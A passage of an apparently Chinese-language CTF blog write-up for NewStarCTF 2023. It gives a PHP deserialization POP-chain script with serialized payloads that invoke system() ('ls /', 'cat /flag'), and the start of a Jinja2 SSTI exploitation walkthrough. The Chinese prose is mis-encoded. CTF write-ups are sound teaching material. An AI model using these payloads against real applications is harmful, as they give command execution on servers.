</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$property</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Unsetting property: &quot;</span> . <span class="hljs-variable">$property</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$obj</span>-&gt;name); <span class="hljs-comment">// è°ƒç”¨__unset()æ–¹æ³•</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªMyClassç±»ï¼Œå®ƒæœ‰ä¸€ä¸ªç§æœ‰å±æ€§<span class="hljs-variable">$name</span>ã€‚å½“ä½¿ç”¨<span class="hljs-keyword">unset</span>()å‡½æ•°åˆ é™¤<span class="hljs-variable">$obj</span>å¯¹è±¡çš„<span class="hljs-variable">$name</span>å±æ€§æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•ä¼šæ˜¾ç¤ºä¸€ä¸ªæ¶ˆæ¯<span class="hljs-string">&quot;Unsetting property: name&quot;</span>ã€‚<br><br>æ³¨æ„ï¼Œ<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•åªä¼šåœ¨è®¿é—®æƒé™å…è®¸çš„æƒ…å†µä¸‹è¢«è°ƒç”¨ã€‚å¦‚æœå±æ€§æ˜¯ç§æœ‰çš„æˆ–å—ä¿æŠ¤çš„ï¼Œåªæœ‰åœ¨ç±»çš„å†…éƒ¨æ‰èƒ½åˆ é™¤è¯¥å±æ€§ã€‚<br></code></pre></td></tr></table></figure><p>popé“¾æ„é€ è„šæœ¬:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-comment">// public function __destruct()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥è°ƒç”¨__toString()å‡½æ•°=&gt;$this-&gt;name=new Then()</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Hello&quot;;</span><br>    <span class="hljs-comment">//     &#125;else&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Welcome to NewStarCTF 2023!&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨ç±»è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå¯åŠ¨__invoke()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __call($func, $vars)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å¯ä»¥æŒ‡å®šç±»çš„å‡½æ•°end()å‡½æ•°è°ƒç”¨</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new CTF()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;end();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __invoke()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //getSträ¸ºHandleç±»çš„ä¸å­˜åœ¨å‡½æ•°æ‰€ä»¥å¯ä»¥ç”¨äºè°ƒç”¨__call</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new Handle()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;getStr();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     die(&quot;==GAME OVER==&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å˜é‡åˆ é™¤å‡½æ•°å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•__unset</span><br>    <span class="hljs-comment">//     //$this-&gt;handle=new WhiteGod()</span><br>    <span class="hljs-comment">//     unset($this-&gt;handle-&gt;log);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-comment">// public function __unset($var)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å±é™©å‡½æ•°æ³¨å…¥=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>    <span class="hljs-comment">//     ($this-&gt;func)($this-&gt;var);    </span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-comment">// @unserialize($_POST[&#x27;pop&#x27;]); </span><br><span class="hljs-comment">//æ„é€ popé“¾:</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$obj</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj3</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj3</span>;<br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133441613.png" alt="image-20231010133441613"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133746261.png" alt="image-20231010133746261"></p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/images/2023-11-3-newstar-3/image-20231010141411989.png" alt="image-20231010141411989"></p><p>ä½¿ç”¨BpæŠ“åŒ…:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141442978.png" alt="image-20231010141442978"></p><p>è®¿é—®:&#x2F;secr3tofpop</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141614595.png" alt="image-20231010141614595"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010141800190.png" alt="image-20231010141800190"></p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¢«æ¸²æŸ“åˆ°äº†ç½‘é¡µä¸Šï¼ŒçŒœæµ‹å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162819362.png" alt="image-20231010162819362"></p><p>å¯ä»¥äº†è§£åˆ°è¯¥sstiæ¨¡æ¿æ³¨å…¥æ˜¯åœ¨python3è¯­è¨€ä¸‹çš„jinja2æ¨¡æ¿æ³¨å…¥</p><p><img src="/images/2023-11-3-newstar-3/image-20231010163040317.png" alt="image-20231010163040317"></p><p>å¯ä»¥äº†è§£åˆ°è¯¥æ¨¡æ¿æ¸²æŸ“æ˜¯ä½¿ç”¨render_template_string()å‡½æ•°</p><p>å…ˆå¯»æ‰¾ç±»os._wrap_closeï¼š<br>å¯»æ‰¾è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class 